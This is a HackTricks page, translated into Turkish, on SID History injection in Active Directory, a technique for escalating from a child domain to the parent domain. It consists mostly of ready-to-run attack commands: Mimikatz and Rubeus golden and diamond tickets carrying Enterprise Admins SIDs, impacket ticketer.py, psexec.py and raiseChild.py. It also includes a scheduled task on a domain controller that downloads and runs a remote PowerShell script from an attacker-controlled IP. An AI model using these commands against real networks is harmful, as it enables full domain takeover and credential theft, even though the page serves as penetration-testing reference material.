# SID Geçmişi Enjeksiyonu

<details>

<summary><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını yapmak** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT koleksiyonumuz**](https://opensea.io/collection/the-peass-family)
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** üzerinden PR göndererek paylaşın.

</details>

## SID Geçmişi Enjeksiyon Saldırısı

**SID Geçmişi Enjeksiyon Saldırısı**nın odak noktası, **kullanıcıların alanlar arası göçü**ne yardımcı olurken eski alanlarındaki kaynaklara sürekli erişimi sağlamaktır. Bunun için kullanıcının yeni hesabının **SID Geçmişi**ne önceki Güvenlik Tanımlayıcısı'nı (SID) dahil etmek gerekmektedir. Özellikle, bu süreç, ebeveyn alanının yüksek ayrıcalıklı bir grubunun (örneğin Enterprise Admins veya Domain Admins) SID Geçmişi'ne eklendiğinde yetkisiz erişim sağlamak için manipüle edilebilir. Bu sömürü, ebeveyn alanındaki tüm kaynaklara erişim sağlar.

Bu saldırıyı gerçekleştirmek için iki yöntem bulunmaktadır: **Golden Ticket** veya **Diamond Ticket** oluşturarak.

"Enterprise Admins" grubunun SID'sini belirlemek için öncelikle kök alanın SID'sini bulmak gerekmektedir. Kimlik tespitinden sonra, Enterprise Admins grubunun SID'si, kök alanın SID'sine `-519` eklenerek oluşturulabilir. Örneğin, kök alanın SID'si `S-1-5-21-280534878-1496970234-700767426` ise, "Enterprise Admins" grubunun sonuçta oluşan SID'si `S-1-5-21-280534878-1496970234-700767426-519` olacaktır.

Ayrıca **Domain Admins** gruplarını da kullanabilirsiniz, bunlar **512** ile biter.

Diğer alanın bir grubunun SID'sini (örneğin "Domain Admins") bulmanın başka bir yolu da:
```powershell
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
### KRBTGT-AES256 ile Golden Ticket (Mimikatz)

{% code overflow="wrap" %}
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
{% endcode %}

Daha fazla bilgi için altın biletler hakkında kontrol edin:

{% content-ref url="golden-ticket.md" %}
[golden-ticket.md](golden-ticket.md)
{% endcontent-ref %}

### Elmas Bilet (Rubeus + KRBTGT-AES256)

{% code overflow="wrap" %}
```powershell
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap

# Or a ptt with a golden ticket
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt

# You can use "Administrator" as username or any other string
```
{% endcode %}

Daha fazla bilgi için elmas biletler hakkında kontrol edin:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

{% code overflow="wrap" %}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
{% endcode %}

Kompromize edilen etki alanının KRBTGT özeti kullanarak kök veya Kurumsal yöneticiye yükseltin:

{% code overflow="wrap" %}
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
{% endcode %}

Saldırıdan elde edilen izinlerle, örneğin yeni etki alanında bir DCSync saldırısı gerçekleştirebilirsiniz:

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

### Linux üzerinden

#### [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) ile manuel olarak
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
{% endcode %}

#### Otomatik olarak [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) kullanarak

Bu, çocuk alanından ana alana yükselme işlemini otomatikleştiren bir Impacket betiğidir. Betik aşağıdakileri gerektirir:

* Hedef etki alanı denetleyicisi
* Çocuk alanında bir yönetici kullanıcısı için kimlik bilgileri

Akış şu şekildedir:

* Ana alanın Enterprise Yöneticileri grubunun SID'sini alır
* Çocuk alanındaki KRBTGT hesabının hash'ini alır
* Bir Golden Ticket oluşturur
* Ana alana giriş yapar
* Ana alanın Yönetici hesabının kimlik bilgilerini alır
* `target-exec` anahtarı belirtilmişse, ana alanın Etki Alanı Denetleyicisine Psexec aracılığıyla kimlik doğrular.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Referanslar
* [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
* [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

<details>

<summary><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını yapmak** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu keşfedin
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.

</details>
